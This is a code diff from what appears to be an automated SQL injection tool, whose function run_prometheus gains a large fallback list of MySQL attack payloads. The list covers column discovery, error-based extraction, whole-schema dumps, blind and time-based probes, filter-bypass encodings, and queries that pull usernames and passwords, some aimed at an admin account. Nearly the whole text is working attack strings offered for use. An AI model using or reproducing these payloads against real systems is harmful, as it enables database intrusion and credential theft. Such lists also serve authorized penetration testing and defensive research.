@@ -53,16 +53,59 @@ def run_prometheus():
     # Fallback/Default payloads if DB is empty or inaccessible
     if not base_payloads:
         base_payloads = [
-          "1 OR 1=1", "1 AND 1=1", "1 OR true", "1 UNION SELECT 1,2", 
-          "1 ORDER BY 1", "1 ORDER BY 2", "1 ORDER BY 5", # Column Discovery Seeds
-          "1 UNION SELECT user,password FROM users", # Targeted Password Seed
-          "1 UNION SELECT password,NULL FROM users", # Targeted Password Seed
-          "1 UNION SELECT 1,group_concat(user,0x3a,password) FROM users", # Advanced Seed
-          "1 AND (SELECT 1 FROM users WHERE user=0x61646d696e AND LENGTH(password)>5)", # Blind Seed
-          "1 AND (SELECT IF(1=1,SLEEP(5),1))", # Time Blind Seed
-          "1 UNION SELECT database(),user()", "1 UNION SELECT NULL,NULL",
-          "1 || 2=2", "1 && 3=3", "1 XOR 1=2", "1 UNION/*bypass*/SELECT 1,2",
-          "1/*!50000UNION*//*!50000SELECT*/1,2"
+            # --- STRUCTURE & DISCOVERY SEEDS (30+) ---
+            *[f"1 ORDER BY {i}" for i in range(1, 21)],
+            *[f"1 GROUP BY {i}" for i in range(1, 11)],
+            "1 PROCEDURE ANALYSE(1,1)",
+            "1 INTO @", "1 INTO @,@", "1 LIMIT 1 INTO @,@",
+            "1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,DATABASE())),1)",
+
+            # --- ADVANCED ERROR-BASED EXFILTRATION (25+) ---
+            "1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT VERSION()),0x7e),1)",
+            "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)",
+            "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))",
+            "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+            "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+            "1 AND EXP(~(SELECT * FROM (SELECT USER())a))",
+            "1 AND JSON_KEYS((SELECT * FROM (SELECT [DATABASE()])a))",
+            "1 AND ST_LatFromGeoHash(CONCAT(0x7e,(SELECT VERSION()),0x7e))",
+            "1 AND ST_LongFromGeoHash(CONCAT(0x7e,(SELECT USER()),0x7e))",
+            "1 AND (SELECT 1 FROM (SELECT @:=0, (SELECT COUNT(*) FROM information_schema.columns WHERE @:=@+1) AS row_count) AS t)",
+            "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+            "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT version()),0x23,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+            "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+
+            # --- DIOS (DUMP IN ONE SHOT) & MASS EXTRACTION (20+) ---
+            "1 UNION SELECT 1,(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)",
+            "1 UNION SELECT 1,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
+            "1 UNION SELECT NULL,(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)",
+            "1 UNION SELECT 1,group_concat(table_name,0x3a,column_name) FROM information_schema.columns WHERE table_schema=database()",
+            "1 UNION SELECT 1,group_concat(user,0x3a,password) FROM users",
+            "1 UNION SELECT 1,@@version_compile_os,@@version_compile_machine",
+            "1 UNION SELECT 1,table_name,NULL FROM information_schema.tables WHERE table_schema=database()",
+            "1 UNION SELECT 1,column_name,NULL FROM information_schema.columns WHERE table_name=0x7573657273",
+
+            # --- ADVANCED BLIND & TIME-BASED PROBING (20+) ---
+            "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)",
+            "1 AND (SELECT 1 FROM (SELECT(BENCHMARK(10000000,MD5(1))))a)",
+            "1 OR (SELECT 1 FROM(SELECT(SLEEP(5)))a)",
+            "1 XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR 1",
+            "1 AND (SELECT 1 FROM users WHERE user=0x61646d696e AND password REGEXP '^a')",
+            "1 AND (SELECT 1 FROM users WHERE user=0x61646d696e AND password LIKE 0x6125)",
+            "1 AND (SELECT ASCII(SUBSTR(password,1,1)) FROM users LIMIT 0,1)>64",
+            "1 AND (SELECT BIT_AND(1,1))",
+            "1 AND (SELECT 1 FROM(SELECT(SLEEP(5)))a) AND 1=1",
+            "1 AND (SELECT 1 FROM(SELECT(SLEEP(5)))a) OR 1=2",
+
+            # --- COMPLEX BYPASS & LOGICAL VARIANTS (15+) ---
+            "1.e(OR)1", "1.e(AND)1", "1||(TRUE)", "1&&(TRUE)", "1 XOR TRUE",
+            "1 || 1 regexp 1", "1 || 1 rlike 1", "1 || 1 between 1 and 1",
+            "1 || 1 in (1)", "1 || 1 is not null", "1 || !0", "1 || ~0",
+            "1 || hex(1)=31", "1 || concat(1)=1", "1 || length(1)=1",
+            "%bf%27 OR 1=1", "%df%27 OR 1=1", "%8c%a8%27 OR 1=1", # Wide-byte
+            "1 /*!50000UNION*//*!50000SELECT*/ 1,2",
+            "1 UNION/**/SELECT/**/1,2",
+            "1 UN/**/ION SEL/**/ECT 1,2"
         ]
     
     # Add quote-based seeds if level is low
